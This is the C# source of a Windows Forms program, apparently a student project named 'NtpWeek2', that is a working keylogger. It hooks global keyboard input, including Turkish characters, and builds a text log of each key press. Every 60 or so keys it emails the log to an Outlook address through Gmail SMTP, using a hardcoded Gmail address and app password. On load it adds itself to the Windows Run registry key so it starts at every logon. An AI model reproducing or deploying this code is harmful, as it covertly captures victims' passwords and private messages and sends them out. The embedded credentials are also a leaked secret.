using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using HootKeys;

namespace NtpWeek2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            ShowKeys();
        }
        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        const int KEYEVENTF_EXTENDEDKEY = 0x1;
        const int KEYEVENTF_KEYUP = 0x2;


        globalKeyboardHook keyboard = new globalKeyboardHook(); // Captures all keyboard events in Windows.
        int number = 0; // counter
        string log ; // logging
        bool BigChar = true;// case sensivity
        void ShowKeys()
        {
            // HookodKeys.Add() : Adds the key in parantheses to the listening list
            
            keyboard.HookedKeys.Add(Keys.A);  
            keyboard.HookedKeys.Add(Keys.S);   
            keyboard.HookedKeys.Add(Keys.D);
            keyboard.HookedKeys.Add(Keys.F);
            keyboard.HookedKeys.Add(Keys.G);
            keyboard.HookedKeys.Add(Keys.H);
            keyboard.HookedKeys.Add(Keys.J);
            keyboard.HookedKeys.Add(Keys.K);
            keyboard.HookedKeys.Add(Keys.L);
            keyboard.HookedKeys.Add(Keys.Z);
            keyboard.HookedKeys.Add(Keys.X);
            keyboard.HookedKeys.Add(Keys.C);
            keyboard.HookedKeys.Add(Keys.V);
            keyboard.HookedKeys.Add(Keys.B);
            keyboard.HookedKeys.Add(Keys.N);
            keyboard.HookedKeys.Add(Keys.M);
            keyboard.HookedKeys.Add(Keys.Q);
            keyboard.HookedKeys.Add(Keys.W);
            keyboard.HookedKeys.Add(Keys.E);
            keyboard.HookedKeys.Add(Keys.R);
            keyboard.HookedKeys.Add(Keys.T);
            keyboard.HookedKeys.Add(Keys.Y);
            keyboard.HookedKeys.Add(Keys.U);
            keyboard.HookedKeys.Add(Keys.I);
            keyboard.HookedKeys.Add(Keys.O);
            keyboard.HookedKeys.Add(Keys.P);

            //Turkish characters

            keyboard.HookedKeys.Add(Keys.OemOpenBrackets);
            keyboard.HookedKeys.Add(Keys.Oem6);
            keyboard.HookedKeys.Add(Keys.Oem1);
            keyboard.HookedKeys.Add(Keys.Oem7);
            keyboard.HookedKeys.Add(Keys.OemQuestion);
            keyboard.HookedKeys.Add(Keys.Oem5);

            //numbers

            keyboard.HookedKeys.Add(Keys.NumPad0);
            keyboard.HookedKeys.Add(Keys.NumPad1);
            keyboard.HookedKeys.Add(Keys.NumPad2);
            keyboard.HookedKeys.Add(Keys.NumPad3);
            keyboard.HookedKeys.Add(Keys.NumPad4);
            keyboard.HookedKeys.Add(Keys.NumPad5);
            keyboard.HookedKeys.Add(Keys.NumPad6);
            keyboard.HookedKeys.Add(Keys.NumPad7);
            keyboard.HookedKeys.Add(Keys.NumPad8);
            keyboard.HookedKeys.Add(Keys.NumPad9);

            //Upper numbers

            keyboard.HookedKeys.Add(Keys.D0);
            keyboard.HookedKeys.Add(Keys.D1);
            keyboard.HookedKeys.Add(Keys.D2);
            keyboard.HookedKeys.Add(Keys.D3);
            keyboard.HookedKeys.Add(Keys.D4);
            keyboard.HookedKeys.Add(Keys.D5);
            keyboard.HookedKeys.Add(Keys.D6);
            keyboard.HookedKeys.Add(Keys.D7);
            keyboard.HookedKeys.Add(Keys.D8);
            keyboard.HookedKeys.Add(Keys.D9);

            //dot, backspace etc.
            keyboard.HookedKeys.Add(Keys.OemPeriod);
            keyboard.HookedKeys.Add(Keys.Back);


            keyboard.HookedKeys.Add(Keys.Space);
            keyboard.HookedKeys.Add(Keys.Enter);
            keyboard.HookedKeys.Add(Keys.CapsLock);

            keyboard.KeyDown += new KeyEventHandler(KeyCombination);
        }



        
        
            
           
            public void Mail()
            {
                try
                {
                    MailMessage txt = new MailMessage();
                    SmtpClient client = new SmtpClient();

                    // Gmail settings
                    client.Credentials = new System.Net.NetworkCredential("meteburak2003@gmail.com", "kiop oghm lzkp brbo");
                    client.Port = 587;
                    client.Host = "smtp.gmail.com";
                    client.EnableSsl = true;

                    txt.Body = log.ToString();
                    txt.Subject = "#Log";
                    txt.From = new MailAddress("meteburak2003@gmail.com");
                    txt.To.Add("ntpweek2@outlook.com");

                    client.Send(txt);
                    
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message);
                }
            }
            
        
        



        void KeyCombination(object sender , KeyEventArgs e)
        {

            if(number > 59) 
            {
                // If is gotten 60 characters , mail is sended and counter resets .
                Mail();
                number = 0;
             
            }
            if (e.KeyCode == Keys.CapsLock)
            {
                // If BigChar is true,the letter is uppercase.
                // If BigChar is false ,the letter is lowercase.
                if (BigChar == true)
                    BigChar = false;
                else
                    BigChar = true;
            }


            //dot , backspace vs
            if (e.KeyCode == Keys.OemPeriod)
            {
                // Adds dot(".")
                log += ".";
                number++; // (number++) counts the key pressed.
            }
            if (e.KeyCode == Keys.Back)
            {   
                //Prints "Back" to confirm the delete operation. 

                log += "*Back*";
                number++;
            }

            // Checking numbers (including numpad and upper numbers)
            if (e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.D0)
            {

                log += "0";
                number++;
            }
            if (e.KeyCode == Keys.NumPad1 || e.KeyCode == Keys.D1)
            {

                log += "1";
                number++;
            }
            if (e.KeyCode == Keys.NumPad2 || e.KeyCode == Keys.D2)
            {

                log += "2";
                number++;
            }
            if (e.KeyCode == Keys.NumPad3 || e.KeyCode == Keys.D3)
            {

                log += "3";
                number++;
            }
            if (e.KeyCode == Keys.NumPad4 || e.KeyCode == Keys.D4)
            {

                log += "4";
                number++;
            }
            if (e.KeyCode == Keys.NumPad5 || e.KeyCode == Keys.D5)
            {

                log += "5";
                number++;
            }
            if (e.KeyCode == Keys.NumPad6 || e.KeyCode == Keys.D6)
            {

                log += "6";
                number++;
            }
            if (e.KeyCode == Keys.NumPad7 || e.KeyCode == Keys.D7)
            {

                log += "7";
                number++;
            }
            if (e.KeyCode == Keys.NumPad8 || e.KeyCode == Keys.D8)
            {

                log += "8";
                number++;
            }
            if (e.KeyCode == Keys.NumPad9 || e.KeyCode == Keys.D9)
            {

                log += "9";
                number++;
            }



            //Turkish characters

            if (e.KeyCode == Keys.OemOpenBrackets)
            {
                if (BigChar == true)
                    log += "Ğ";
                else
                    log += "ğ";

                number++;
            }
            if (e.KeyCode == Keys.Oem6)
            {
                if (BigChar == true)
                    log += "Ü";
                else
                    log += "ü";

                number++;
            }
            if (e.KeyCode == Keys.Oem1)
            {
                if (BigChar == true)
                    log += "Ş";
                else
                    log += "ş";

                number++;
            }

            if (e.KeyCode == Keys.Oem7)
            {
                if (BigChar == true)
                    log += "İ";
                else
                    log += "i";

                number++;
            }
            if (e.KeyCode == Keys.OemQuestion)
            {
                if (BigChar == true)
                    log += "Ö";
                else
                    log += "ö";

                number++;
            }
            if (e.KeyCode == Keys.Oem5)
            {
                if (BigChar == true)
                    log += "Ç";
                else
                    log += "ç";

                number++;
            }


            //ENTER BACKSPACE VS

            if (e.KeyCode == Keys.Enter)
            {
                log += " -enter- ";
                number++;
            }

            if (e.KeyCode == Keys.Space)
            {
                log += " ";
                number++;
            }


            //other characters


            if (e.KeyCode == Keys.A)
            {
                if (BigChar == true)
                    log += "A";
                else
                    log += "a";

                number++;
            }
            if (e.KeyCode == Keys.S)
            {
                if (BigChar == true)
                    log += "S";
                else
                    log += "s";

                number++;
            }
            if (e.KeyCode == Keys.D)
            {
                if (BigChar == true)
                    log += "D";
                else
                    log += "d";

                number++;
            }
            if (e.KeyCode == Keys.F)
            {

                if (BigChar == true)
                    log += "F";
                else
                    log += "f";

                number++;
            }
            if (e.KeyCode == Keys.G)
            {

                if (BigChar == true)
                    log += "G";
                else
                    log += "g";

                number++;
            }
            if (e.KeyCode == Keys.H)
            {

                if (BigChar == true)
                    log += "H";
                else
                    log += "h";

                number++;
            }
            if (e.KeyCode == Keys.J)
            {

                if (BigChar == true)
                    log += "J";
                else
                    log += "j";

                number++;
            }
            if (e.KeyCode == Keys.K)
            {

                if (BigChar == true)
                    log += "K";
                else
                    log += "k";

                number++;

            }
            if (e.KeyCode == Keys.L)
            {

                if (BigChar == true)
                    log += "L";
                else
                    log += "l";

                number++;
            }
            if (e.KeyCode == Keys.Z)
            {

                if (BigChar == true)
                    log += "Z";
                else
                    log += "z";

                number++;
            }
            if (e.KeyCode == Keys.X)
            {

                if (BigChar == true)
                    log += "X";
                else
                    log += "x";

                number++;
            }
            if (e.KeyCode == Keys.C)
            {

                if (BigChar == true)
                    log += "C";
                else
                    log += "c";

                number++;
            }
            if (e.KeyCode == Keys.V)
            {

                if (BigChar == true)
                    log += "V";
                else
                    log += "v";

                number++;
            }
            if (e.KeyCode == Keys.B)
            {

                if (BigChar == true)
                    log += "B";
                else
                    log += "b";

                number++;
            }
            if (e.KeyCode == Keys.N)
            {

                if (BigChar == true)
                    log += "N";
                else
                    log += "n";

                number++;
            }
            if (e.KeyCode == Keys.M)
            {

                if (BigChar == true)
                    log += "M";
                else
                    log += "m";

                number++;

            }
            if (e.KeyCode == Keys.Q)
            {

                if (BigChar == true)
                    log += "Q";
                else
                    log += "q";

                number++;
            }
            if (e.KeyCode == Keys.W)
            {

                if (BigChar == true)
                    log += "W";
                else
                    log += "w";

                number++;
            }
            if (e.KeyCode == Keys.E)
            {

                if (BigChar == true)
                    log += "E";
                else
                    log += "e";

                number++;
            }
            if (e.KeyCode == Keys.R)
            {

                if (BigChar == true)
                    log += "R";
                else
                    log += "r";

                number++;
            }
            if (e.KeyCode == Keys.T)
            {

                if (BigChar == true)
                    log += "T";
                else
                    log += "t";

                number++;
            }
            if (e.KeyCode == Keys.Y)
            {

                if (BigChar == true)
                    log += "Y";
                else
                    log += "y";

                number++;
            }
            if (e.KeyCode == Keys.U)
            {

                if (BigChar == true)
                    log += "U";
                else
                    log += "u";

                number++;
            }
            if (e.KeyCode == Keys.I)
            {

                if (BigChar == true)
                    log += "I";
                else
                    log += "ı";

                number++;
            }
            if (e.KeyCode == Keys.O)
            {

                if (BigChar == true)
                    log += "O";
                else
                    log += "o";

                number++;
            }
            if (e.KeyCode == Keys.P)
            {

                if (BigChar == true)
                    log += "P";
                else
                    log += "p";

                number++;
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            if (Control.IsKeyLocked(Keys.CapsLock))
            {
                BigChar = true;   
                
            }
            else
            {
                BigChar = false; 
            }

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("NtpWeek2", "\"" + Application.ExecutablePath + "\"");
        }

        private void Form1_Click(object sender, EventArgs e)
        {
            
        }
    }
}
